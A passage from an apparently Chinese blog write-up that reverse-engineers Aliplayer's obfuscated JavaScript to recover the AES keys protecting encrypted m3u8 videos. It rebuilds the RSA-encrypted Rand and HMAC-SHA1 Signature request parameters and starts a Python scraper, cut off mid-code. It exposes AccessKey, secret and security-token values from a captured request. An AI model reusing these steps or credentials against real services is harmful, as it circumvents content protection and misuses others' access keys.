1044</h3><p>对拼接在一起的字符串做 MD5。<br>在 d &#x3D;&#x3D; 1075 时，取出了 <code>toString()</code> 函数，看来又要转为 HEX 了。<br>在 d &#x3D;&#x3D; 1102 时，把 MD5 的 array 转成了 HEX。 在 d &#x3D;&#x3D; 1128<br>前面的时候，又取出了 <code>subString()</code> 函数，估计又是切片。<br>在 d &#x3D;&#x3D; 1174 时，做了切片，还是取出 [8:24] 位。<br>在 d &#x3D;&#x3D; 1125 时，又把切片转成了 array。根据上面的经验，估计要用来做 key 或者 iv。<br>至此关键参数都拿到了，中间过程就就省略了，直接在 <code>case 37</code> 下断，查看 AES 解密过程。</p><h3 id="d-1402"><a href="#d-1402" class="headerlink" title="d 1402"></a>d 1402</h3><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_180137.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_180137.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_180137.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>其中需要解密的字符串就是 <code>r.plaintext</code>，key 是第二个切片，iv 是第一个切片。<br>解密出来的内容经过测试，正是 m3u8 文件的真实 key。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这将被不会是惟一一次遇到这坨 <code>switch</code>，后面的就简要描述了，就是比较费体力。</p><h1 id="参数都是哪来的？"><a href="#参数都是哪来的？" class="headerlink" title="参数都是哪来的？"></a>参数都是哪来的？</h1><p>上面已经把解密的过程搞清楚了，可用来解密的三个参数是怎么来的呢？<br>通过观察发现，后两个参数是向 ali 服务器请求得到的，那么请求的参数是如何组织的呢？<br>下面先来看一下上文中屡次提到的未知串是如何产生的。</p><h2 id="未知串的生成"><a href="#未知串的生成" class="headerlink" title="未知串的生成"></a>未知串的生成</h2><p>把目光聚焦到未知串 <code>u</code> 的调用的地方，往上看：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_202851.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_202851.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_202851.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div> 参数<p><code>u</code> 就是这里产生的， 下断后 F11 进去看看：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_203519.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_203519.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_203519.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>此时，上次的断点又起作用了，这次调用的是 <code>jsvmportal_0_2()&#123;...&#125;</code>。<br>看来这个未知串也是在这一坨 <code>switch</code> 中产生的。</p><h3 id="再探-jsvm-this-run"><a href="#再探-jsvm-this-run" class="headerlink" title="再探 jsvm_this_run"></a>再探 jsvm_this_run</h3><p>当 d &lt; 10 时，初始化了 <code>s</code>，然后从 <code>s</code> 中取出了一个固定串 <code>ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz234567890</code><br>在 d &#x3D;&#x3D; 122 之前，取出了 <code>charAt()</code> 函数。<br>在 d &#x3D;&#x3D; 133 之前，取出了 <code>floor()</code> 函数。<br>在 d &#x3D;&#x3D; 138 ~ 159 之间，取出了 <code>random()</code> 函数。<br>看这架势貌似未知串是一串随机的字符串，可如果真的是随机的，那如何用这串字符来解密验证服务器返回的内容的呢？<br>先不考虑这个问题，接着看： 在 d &#x3D;&#x3D; 159 时，获得了一个随机数。<br>这里需要格外关注一个 <code>case 50</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">50</span>:</span><br><span class="line">    V = w &gt;&gt; <span class="number">7</span> &amp; <span class="number">31</span>;</span><br><span class="line">    S = w &gt;&gt; <span class="number">12</span> &amp; <span class="number">31</span>;</span><br><span class="line">    L = w &gt;&gt; <span class="number">17</span> &amp; <span class="number">31</span>;</span><br><span class="line">    o[V] = o[S] * o[L];</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>在 d &#x3D;&#x3D; 202 之前，使用 <code>_maxPos1</code> &#x3D;&#x3D; len(‘ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz234567890’) 和随机数做了乘法。<br>在 d &#x3D;&#x3D; 202 时，对这个乘积做了 <code>floor()</code>。<br>在 d &#x3D;&#x3D; 238 时，使用这个截断的乘积作为下标，在固定串中做了 <code>charAt()</code>，返回了一个字符。<br>接下来的操作便是重复上面的过程，知道字符数量到达 16 个。<br>由此看出，未知串确实是随机串，那么要想能够用来解密，必然要通过某种方式传递这个随机串到请求服务器，才能下发 <code>rand, plaintext</code>。</p><h2 id="请求参数都有谁？"><a href="#请求参数都有谁？" class="headerlink" title="请求参数都有谁？"></a>请求参数都有谁？</h2><p>因为原请求链接是非常复杂的，很多 % 都被编码为 %25 了。<br>更详细的操作需要参照源码一点点修改，那么接下来主要是：找到这些参数的位置，并依次生成这些参数。<br>方便起见，把链接 urldecode（后面再讨论 urlencode 问题）</p><pre><code>https://vod.cn-shanghai.aliyuncs.com/?AccessKeyId=STS.NTQjdSinEj5w48GbKhRKRqnbz&amp;Action=GetPlayInfo&amp;AuthInfo=&#123;&quot;CI&quot;:&quot;zWr678OZfpobCs5lUn/fJJGj6uJwbzzBhRcO73/ef+lSP6mn+cJ94v2lEjpPbpP1&quot;,&quot;Caller&quot;:&quot;bvVtjHFVBjo9sajhvizAu3UfAhXkdP7eXp72anfOvME=&quot;,&quot;ExpireTime&quot;:&quot;2021-08-12T13:16:25Z&quot;,&quot;MediaId&quot;:&quot;e3d536a098784c0fa612815d816ac9ae&quot;,&quot;PlayDomain&quot;:&quot;video.87fun.com&quot;,&quot;Signature&quot;:&quot;uG8uAkGT+aRCemRu/WqZgq/F53g=&quot;&#125;&amp;AuthTimeout=7200&amp;Channel=HTML5&amp;Format=JSON&amp;Formats=&amp;PlayConfig=&#123;&quot;PreviewTime&quot;:0&#125;&amp;PlayerVersion=2.8.2&amp;Rand=AQi7CV1eVvU1wc3C97wCzXpLlgTpXO3Jck1rF/w94qQeDNw0PwcYNJx3SBG9mV44wxhUai8jddgn5dEfuvl2GA==&amp;ReAuthInfo=&#123;&#125;&amp;SecurityToken=CAIShwN1q6Ft5B2yfSjIr5fkId7nhLFk3fecNh72hks9XsR+nqvJmDz2IH1EfnloAOkasPwzlWtR6fwelrMqGsIeGRWVPZIhtcgKqFLwJpLFst2J6r8JjsUG6JQv0FmpsvXJasDVEfl2E5XEMiIR/00e6L/+cirYpTXHVbSClZ9gaPkOQwC8dkAoLdxKJwxk2t14UmXWOaSCPwLShmPBLUxmvWgGl2Rzu4uy3vOd5hfZp1r8xO4axeL0PoP2V81lLZplesqp3I4Sc7baghZU4glr8qlx7spB5SyVktyWGUhJ/zaLIoit7NpjfiB0eoQAPopFp/X6jvAawPLUm9bYxgphB8R+Xj7DZYaux7GzeoWTO80+aKzwNlnUz9mLLeOViQ4/Zm8BPw44ELhIaF0IUExzFmqCd/X4ogyQO17yGpLoiv9mjcBHqHzz5sePKlS1RLGU7D0VIJdUbTlzak5MjTS4K/NYK1AdKAo4XeqPMax3bQFDr53vsTbbXzZb0mptuPnzd1QICFfMlEeUGoABbNIXgnHlqfHlVA1TgyZXZgjybrSAwac2kXbomEgSloqUn9x6DRjvX0orokFsSnEd99afVKsEcThWe06Jqowh1CDvkk8NAKwBVFSq/jmap76vkWKmMoix1Rym9Y9IsoRE8t61+RGWa+MiADACbO9Nr2muSNDNy42+BUuoIdtLPOg=&amp;SignatureMethod=HMAC-SHA1&amp;SignatureNonce=668f517b-6031-495d-8a70-8a2456a2f563&amp;SignatureVersion=1.0&amp;StreamType=video&amp;Version=2017-03-21&amp;VideoId=e3d536a098784c0fa612815d816ac9ae&amp;Signature=V2JtxHFLxalJXyMSoVIkCyty70s=</code></pre><h3 id="playauth"><a href="#playauth" class="headerlink" title="playauth"></a>playauth</h3><p>根据帮助文档 <code>playauth</code> 是在页面中的，包含了请求的很多参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;SecurityToken&quot;</span>: <span class="string">&quot;CAIShwN1q6Ft5B2yfSjIr5fkId7nhLFk3fecNh72hks9XsR+nqvJmDz2IH1EfnloAOkasPwzlWtR6fwelrMqGsIeGRWVPZIhtcgKqFLwJpLFst2J6r8JjsUG6JQv0FmpsvXJasDVEfl2E5XEMiIR/00e6L/+cirYpTXHVbSClZ9gaPkOQwC8dkAoLdxKJwxk2t14UmXWOaSCPwLShmPBLUxmvWgGl2Rzu4uy3vOd5hfZp1r8xO4axeL0PoP2V81lLZplesqp3I4Sc7baghZU4glr8qlx7spB5SyVktyWGUhJ/zaLIoit7NpjfiB0eoQAPopFp/X6jvAawPLUm9bYxgphB8R+Xj7DZYaux7GzeoWTO80+aKzwNlnUz9mLLeOViQ4/Zm8BPw44ELhIaF0IUExzFmqCd/X4ogyQO17yGpLoiv9mjcBHqHzz5sePKlS1RLGU7D0VIJdUbTlzak5MjTS4K/NYK1AdKAo4XeqPMax3bQFDr53vsTbbXzZb0mptuPnzd1QICFfMlEeUGoABbNIXgnHlqfHlVA1TgyZXZgjybrSAwac2kXbomEgSloqUn9x6DRjvX0orokFsSnEd99afVKsEcThWe06Jqowh1CDvkk8NAKwBVFSq/jmap76vkWKmMoix1Rym9Y9IsoRE8t61+RGWa+MiADACbO9Nr2muSNDNy42+BUuoIdtLPOg=&quot;</span>,</span><br><span class="line">    <span class="string">&quot;AuthInfo&quot;</span>: <span class="string">&quot;&#123;\&quot;CI\&quot;:\&quot;zWr678OZfpobCs5lUn/fJJGj6uJwbzzBhRcO73/ef+lSP6mn+cJ94v2lEjpPbpP1\&quot;,\&quot;Caller\&quot;:\&quot;bvVtjHFVBjo9sajhvizAu3UfAhXkdP7eXp72anfOvME=\&quot;,\&quot;ExpireTime\&quot;:\&quot;2021-08-12T13:16:25Z\&quot;,\&quot;MediaId\&quot;:\&quot;e3d536a098784c0fa612815d816ac9ae\&quot;,\&quot;PlayDomain\&quot;:\&quot;video.87fun.com\&quot;,\&quot;Signature\&quot;:\&quot;uG8uAkGT+aRCemRu/WqZgq/F53g=\&quot;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;VideoMeta&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Status&quot;</span>: <span class="string">&quot;Normal&quot;</span>,</span><br><span class="line">        <span class="string">&quot;VideoId&quot;</span>: <span class="string">&quot;e3d536a098784c0fa612815d816ac9ae&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Title&quot;</span>: <span class="string">&quot;GOM_JS_01_DBC2000.mp4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CoverURL&quot;</span>: <span class="string">&quot;https://video.87fun.com/e3d536a098784c0fa612815d816ac9ae/snapshots/b114172681bb4d31ad9544c19eae9a33-00005.jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Duration&quot;</span>: <span class="number">289.066</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;AccessKeyId&quot;</span>: <span class="string">&quot;STS.NTQjdSinEj5w48GbKhRKRqnbz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PlayDomain&quot;</span>: <span class="string">&quot;video.87fun.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;AccessKeySecret&quot;</span>: <span class="string">&quot;B198GPkJVhTjn5QNfbaXDTbNt2xBN5k6uy2xha3unNeE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Region&quot;</span>: <span class="string">&quot;cn-shanghai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CustomerId&quot;</span>: <span class="number">1953419819345199</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据关键词 <code>send()</code>&#x2F;<code>2017-03-21</code>&#x2F;<code>HMAC-SHA1</code>&#x2F;<code>Signature</code> 之类的定位：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_221723.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_221723.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_221723.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p><code>SignatureNonce</code> 对应的是 <code>randomUUID()</code>，是一个很简单的随机 UUID 生成器：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_222212.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_222212.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_222212.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>那么至此，就还剩两个参数没有搞定：<code>Rand</code> 和 <code>Signature</code></p><h3 id="Rand"><a href="#Rand" class="headerlink" title="Rand"></a>Rand</h3><p>这个参数的获取就在随机串的函数之后，也是调用了 <code>switch</code> 混淆的。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_211344.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_211344.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_211344.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>这次调用的是 <code>aliplayer-vod-min.js</code> 中的最后一个函数。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_211422.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_211422.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_211422.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>这个函数竟然需要调用两次 <code>switch</code> 要疯了。仔细观察，貌似这是一个加密或者解密操作，需要用到 KEY。</p><h4 id="jsvm-this-run-四进宫"><a href="#jsvm-this-run-四进宫" class="headerlink" title="jsvm_this_run 四进宫"></a>jsvm_this_run 四进宫</h4><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_211521.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_211521.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_211521.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>进入后看到 u 的参数发现这里貌似是在组成 <code>RSA</code> 的公钥。已经后很多个串了，都是从 <code>s</code> 中取出来的。<br>下面就不跟了，还是利用以前的断点，按几次 F8 就能在 h 中找到公钥了。<br>在 d &#x3D;&#x3D; 1935 之前，在 h[22]<br>中就已经获得完整的公钥，给出的字符串并没有都使用：</p><pre><code>-----BEGIN PUBLIC KEY-----MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAIcLeIt2wmIyXckgNhCGpMTAZyBGO+nk0/IdOrhIdfRRgBLHdydsftMVPNHrRuPKQNZRslWE1vvgx80w9lCllIUCAwEAAQ==-----END PUBLIC KEY-----</code></pre><p>得到公钥后把它复制给了 _sce_lgtcaygl 中的几个带 _key 的参数中，然后就返回了。<br>下面就是四进宫了，这次终于比较简单：<br>在 d &#x3D;&#x3D; 343 之前，取得了 RSA 公钥。<br>在 d &#x3D;&#x3D; 343 时，使用这个公钥初始化了一个 posdk 类 <code>_vndhsje</code>，使用这个类加密某些内容。<br>在 d &#x3D;&#x3D; 374 之前，取得了随机串，这个随机串也被存储到了 <code>s[137]</code> 中。<br>在 d &#x3D;&#x3D; 374 时，执行加密。 &lt;WRAP center round important 80%&gt; RSA 加密每次的结果都是不相同的。那如何判断使用了哪种 padding 呢？如果单步执行不难发现是 <code>PKCS1_V1_5</code>，或者可以直接搜索关键词 <code>pkcs</code>&#x2F;<code>oaep</code>，后者无结果，前者相关的有一个函数正好位于 <code>vnskak</code> 中这就是 posdk 类；此外还可以用请求尝试的方式，不正确的 padding 会提醒 <code>SignatureNonce</code> 失效。 </WRAP></p><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>把其他的断点都勾掉，在上上图中的 下面代码处 下断，因为该处生成了 Signature。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e = n.<span class="title function_">makeUTF8sort</span>(e, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&amp;&quot;</span>) + <span class="string">&quot;&amp;Signature=&quot;</span> + n.<span class="title class_">AliyunEncodeURI</span>(n.<span class="title function_">makeChangeSiga</span>(e, s.<span class="property">accessSecret</span>)),</span><br></pre></td></tr></table></figure><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_223334.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_223334.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_223334.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div><br><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_225115.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_225115.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_225115.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div> e<p>是请求链接中除最后一个参数外的其余所有参数 urlencode 的字符串，类似于字典的结构，但无论 key,value 都 urlencode，然后使用 <code>=</code> 和 <code>&amp;</code> 拼接起来，这是请求链接前面的部分，后面的就是签名：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2021/aliplayer/2021-08-12_224005.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2021/aliplayer/2021-08-12_224005.png" class="lazyload" data-srcset="/img/2021/aliplayer/2021-08-12_224005.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>其中函数 n() 就是 HMAC-SHA1 算法，o.stringify() 是 base64 加密算法。<br>n() 的第二个参数是 key，也就是说 <code>accessSecret + &#39;&amp;</code>‘ 就是 HMAC 的 key。<br>最后把目光放在需要签名的内容上：其实是在 makeUTF8sort() 的基础上又做了一次 urlencode，然后在前面加上 <code>GET&amp;/&amp;</code></p><h1 id="实现请求"><a href="#实现请求" class="headerlink" title="实现请求"></a>实现请求</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">db = &#123;&#125;</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;data.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allinone</span>(<span class="params">customurl, num</span>):</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>, <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Chromium&quot;;v=&quot;92&quot;, &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;92&quot;&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;Chrome/92.0.4515.131 Safari/537.36&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                         <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;none&#x27;</span>, <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;navigate&#x27;</span>, <span class="string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>, <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;</span>, &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.get(customurl, headers=headers)</span><br><span class="line">    page = r.text</span><br><span class="line"></span><br><span class="line">    htmlpage = etree.HTML(page)</span><br><span class="line">    data[<span class="string">&quot;Title&quot;</span>] = htmlpage.xpath(<span class="string">&#x27;//title&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data[<span class="string">&quot;Introduce&quot;</span>] = b64encode(etree.tostring(htmlpage.xpath(<span class="string">&#x27;//div[@id=&quot;introduce&quot;]&#x27;</span>)[<span class="number">0</span>])).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        playauthmatch = re.search(<span class="string">r&quot;playauth\W+&#x27;.*&#x27;&quot;</span>, page[page.index(<span class="string">&#x27;new Aliplayer&#x27;</span>):])</span><br><span class="line"></span><br><span class="line">        playauth = playauthmatch.group(<span class="number">0</span>)</span><br><span class="line">        playauth = playauth[playauth.index(<span class="string">&#x27;eyJ&#x27;</span>):-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        b64playauth = b64decode(playauth.encode(<span 